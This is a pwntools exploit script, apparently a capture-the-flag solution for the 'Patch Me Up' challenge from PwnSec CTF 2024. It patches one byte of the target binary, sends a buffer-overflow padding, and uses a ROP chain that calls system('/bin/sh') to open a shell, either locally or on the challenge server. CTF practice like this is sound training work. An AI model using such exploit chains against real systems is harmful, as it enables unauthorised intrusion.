#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/PwnSec CTF 2024/pwn/Patch Me Up/patchMeUp')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = [r'set {char}0x4017ff=0x75']

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    rop = ROP(elf)
    rop.raw(b'A' * 0x58)
    rop.raw(rop.ret)
    rop.call(elf.sym.system, [next(elf.search(b'/bin/sh'))])

    if REMOTE:
        r.sendlineafter(b'Enter the byte offset to patch (in hexadecimal, e.g. 0xff): ', b'0x17ff')
        r.sendlineafter(b'Enter the byte value to patch (in hexadecimal, e.g. 0xff): ', b'0x75')
        r.sendlineafter(b'=== Executing Patched Binary ===\n', rop.chain())
    else:
        r.sendline(rop.chain())

    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('pwn-patchmeup.pwnsec.xyz', 37117)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
